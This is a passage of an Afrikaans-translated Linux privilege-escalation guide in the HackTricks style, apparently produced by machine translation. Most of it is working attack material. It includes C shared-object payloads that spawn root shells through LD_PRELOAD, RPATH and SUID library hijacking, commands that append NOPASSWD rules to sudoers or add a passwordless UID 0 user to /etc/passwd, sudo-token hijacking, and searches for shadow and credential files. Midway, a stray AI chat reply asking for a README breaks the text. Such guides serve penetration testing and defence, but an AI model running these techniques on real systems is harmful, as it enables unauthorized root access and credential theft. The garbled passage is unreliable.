interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing ken, **probeer by elke gebruiker aanmeld** met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te veroorsaak en die `su` en `timeout` binaries op die rekenaar teenwoordig is nie, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH-misbruik

### $PATH

As jy ontdek dat jy **in 'n gids van die $PATH kan skryf**, kan dit dalk moontlik wees om bevoegdhede te eskaleer deur **'n backdoor in die skryfbare gids te skep** met die naam van 'n kommando wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie vanaf 'n gids wat voor jou skryfbare gids in die $PATH geleë is gelaai word nie**.

### SUDO and SUID

Jy mag toegelaat word om sekere opdragte met sudo uit te voer, of sommige kan die suid-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte commands laat jou toe om lêers te lees en/of te skryf of selfs 'n command uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om 'n opdrag met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer; dit is nou maklik om 'n shell te kry deur 'n ssh key in die root-gids by te voeg of deur `sh` op te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **set an environment variable** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwetsbaar** vir **PYTHONPATH hijacking** om 'n arbitrêre python-biblioteek te laai terwyl die skrip as root uitgevoer is:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo: omseiling van uitvoeringspaaie

**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

As die **sudo toestemming** aan 'n enkele command **sonder om die pad te spesifiseer** gegee word: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH variable te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **'n ander opdrag uitvoer sonder om die pad daarvan te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met opdragpad

Indien die **suid** binary **'n ander opdrag uitvoer en die pad spesifiseer**, kan jy probeer om **export a function** met dieselfde naam as die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binary _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so files) aan te dui wat deur die loader vóór alle ander, insluitend die standaard C-biblioteek (`libc.so`), gelaai moet word. Hierdie proses staan bekend as die vooraflaai van 'n biblioteek.

Om egter stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruiker-ID (_ruid_) nie ooreenstem met die effektiewe gebruiker-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is voorafgelaai.

Privilegie-eskalasie kan voorkom as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike behoue bly en erken word, selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van ewekansige kode met verhoogde voorregte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **compile dit** met behulp van:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **escalate privileges** deur dit uit te voer
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 'n soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** env-variabele beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy op 'n binary met **SUID** permissions stuit wat ongewoon lyk, is dit 'n goeie praktyk om te verifieer of dit **.so** lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, die teëkoms van 'n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui op 'n potensiaal vir exploitation.

Om dit te exploit, sal 'n mens voortgaan deur 'n C file te skep, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende code bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit gekompileer en uitgevoer is, poog om privileges te verhoog deur lêertoestemmings te manipuleer en 'n shell met verhoogde privileges uit te voer.

Kompileer die bogenoemde C-lêer na 'n shared object (.so)-lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoering van die aangetaste SUID binary die exploit te aktiveer, wat potensiële system compromise moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID binary gevind het wat 'n library laai vanaf 'n gids waar ons in kan skryf, kom ons skep die library in daardie gids met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekureerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **only inject arguments** in 'n command.

Die projek versamel legitieme funksies van Unix binaries wat misbruik kan word om restricted shells te ontsnap, voorregte op te skaal of verhoogde voorregte te behou, lêers oor te dra, bind and reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die hulpmiddel [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit vind hoe om enige sudo-regel uit te buit.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy voorregte op te skaal deur **te wag vir 'n sudo-opdrag-uitvoering en dan die sessie-token te kaap**.

Vereistes om voorregte op te skaal:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15 minute** (by default is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy sal dit kan oplaai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` te stel)

As al hierdie vereistes nagekom is, **kan jy voorregte op te skaal met:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **first exploit** (`exploit.sh`) sal die binêre `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die sudo-token in jou sessie **te aktiveer** (jy sal nie outomaties 'n root-shell kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ skep wat **deur root besit word met setuid**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **skep 'n sudoers file** wat **sudo tokens ewig maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Indien jy **skryfregte** op die gids of op enige van die lêers daarin het, kan jy die binêre [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **'n sudo token vir 'n gebruiker en PID te skep**.\

Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy 'n shell as daardie gebruiker met PID 1234 het, kan jy **sudo-voorregte verkry** sonder om die wagwoord te hoef te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` konfigureer wie `sudo` kan gebruik en hoe. Hierdie lêers **kan standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer **kan lees** kan jy moontlik **sekere interessante inligting verkry**, en as jy enige lêer **kan skryf** sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog ’n manier om hierdie toestemmings te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binary soos `doas` vir OpenBSD; onthou om sy konfigurasie by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n **gebruiker gewoonlik op 'n masjien koppel en `sudo` gebruik** om voorregte te eskaleer en jy het 'n shell binne daardie gebruiker-konteks, kan jy **'n nuwe sudo-uitvoerbare lêer skep** wat jou kode as root sal uitvoer en daarna die gebruiker se opdrag. Daarna, **wysig die $PATH** van die gebruiker-konteks (bv. deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo-uitvoerbare lêer uitgevoer word.

Let wel dat as die gebruiker 'n ander shell gebruik (nie bash nie) jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** na **gesoek** gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel na biblioteke binne `/usr/local/lib` sal soek**.

As 'n gebruiker vir enige rede **skryfbevoegdheid het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer aangedui in `/etc/ld.so.conf.d/*.conf` kan hy moontlik escalate privileges.\
Kyk na **how to exploit this misconfiguration** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH`-veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux capabilities provide a **substel van die beskikbare root voorregte aan 'n proses**. Dit breek effektief root **voorregte op in kleiner en onderskeibare eenhede**. Elk van hierdie eenhede kan dan onafhanklik aan prosesse toegewys word. Op hierdie manier word die volle stel voorregte verminder, wat die risiko's van uitbuiting laat afneem.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Gids toestemmings

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, in staat om die tradisionele ugo/rwx permissions te **oorskryf**. Hierdie toestemmings verbeter beheer oor lêer- of gids-toegang deur regte aan of van spesifieke gebruikers wat nie die eienaars of deel van die groep is nie toe te ken of te weier. Hierdie vlak van **granulariteit verseker meer presiese toegangsbestuur**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop shell-sessies

In **ouer weergawes** kan jy dalk 'n **shell**-essie van 'n ander gebruiker (**root**) **hijack**.\
In **nuutste weergawes** sal jy slegs **verbinding maak** met screen-sessies van **jou eie gebruiker**. Jy kan egter **interessante inligting binne die sessie** vind.

### screen sessions hijacking

**Lys screen-sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dit was 'n probleem met **oue tmux weergawes**. Ek kon nie 'n tmux (v2.1) session wat deur root geskep is as 'n non-privileged user kap nie.

**Lys tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout geraak wees.\
Hierdie fout kom voor wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat alle moontlikhede bereken kan word en **as jy die ssh publieke sleutel het, kan jy na die ooreenstemmende private sleutel soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasie-waardes

- **PasswordAuthentication:** Bepaal of wagwoordverifikasie toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Bepaal of publieke sleutel-verifikasie toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, bepaal dit of die bediener aanmelding vir rekeninge met leë wagwoordstringe toelaat. Die verstek is `no`.

### PermitRootLogin

Bepaal of root kan aanmeld met ssh; die verstek is `no`. Moglike waardes:

- `yes`: root kan aanmeld met wagwoord en private sleutel
- `without-password` of `prohibit-password`: root kan slegs aanmeld met 'n private sleutel
- `forced-commands-only`: Root kan slegs aanmeld met 'n private sleutel en slegs as die commands-opsies gespesifiseer is
- `no`: nie toegelaat nie

### AuthorizedKeysFile

Bepaal lêers wat die publieke sleutels bevat wat vir gebruiker-verifikasie gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die tuisgids. **Jy kan absolute paaie aandui** (begin met `/`) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer aanmeld met die **private** sleutel van die gebruiker "**testusername**" gaan ssh die public key van jou sleutel vergelyk met die een wat geleë is in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om jou local SSH keys te gebruik in plaas daarvan om sleutels (sonder passphrases!) op jou bediener te laat staan. Dus sal jy in staat wees om via ssh na 'n host te **jump** en van daar na 'n ander host te **jump** deur die **key** wat op jou **initial host** is te gebruik.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer wanneer die gebruiker na 'n ander masjien spring, daardie gasheer toegang tot die sleutels sal hê (wat 'n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorskryf** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding **toelaat** of **weier** met die sleutelwoord `AllowAgentForwarding` (standaard is toelaat).

As jy vind dat Forward Agent in 'n omgewing gekonfigureer is, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiellêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enige van hulle kan **skryf of wysig, kan jy escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As enige vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow lêers

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **hulle almal te vind** en **na te gaan of jy dit kan lees** om te sien **of daar hashes in die lêers is**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Soms kan jy **password hashes** in die `/etc/passwd` (of 'n ekwivalente) lêer vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbaar /etc/passwd

Eerstens, genereer 'n password met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ek het nie die inhoud van src/linux-hardening/privilege-escalation/README.md ontvang nie. Plak asseblief die README-inhoud wat jy wil hê ek moet na Afrikaans vertaal.

Ter verduideliking:
- Ek kan nie 'n skuif op jou stelsel maak of 'n werklike gebruiker skep nie. Ek kan wel die vertaalde Markdown wysiging lewer wat die reël bevat om die gebruiker `hacker` te voeg en 'n gegenereerde wagwoord te toon.
- Wil jy dat ek 'n veilige, gegenereerde wagwoord skep? As ja, gee asseblief vereistes (lengte, gebruik van simboles, ens.), en waar in die dokument jy die reël wil hê (aan die begin, onderaan, of naby sekere afdeling).

Stuur asseblief die README, en bevestig die wagwoordvereistes en invoegplek.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende reëls gebruik om 'n dummy-gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: dit kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy in sommige **sensitiewe lêers** kan skryf. Byvoorbeeld, kan jy in 'n **dienskonfigurasielêer** skryf?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** bediener aan die gang is en jy die **Tomcat-dienskonfigurasielêer binne /etc/systemd/** kan wysig, kan jy die volgende rye wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat gestart word.

### Kontroleer gidse

Die volgende gidse kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer dit.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die afgelope minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy hiervoor kan gebruik is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open-source toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar gestoor is vir Windows, Linux & Mac op te haal.

### Logs

As jy logs kan lees, kan jy moontlik **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe interessanter sal dit waarskynlik wees.\
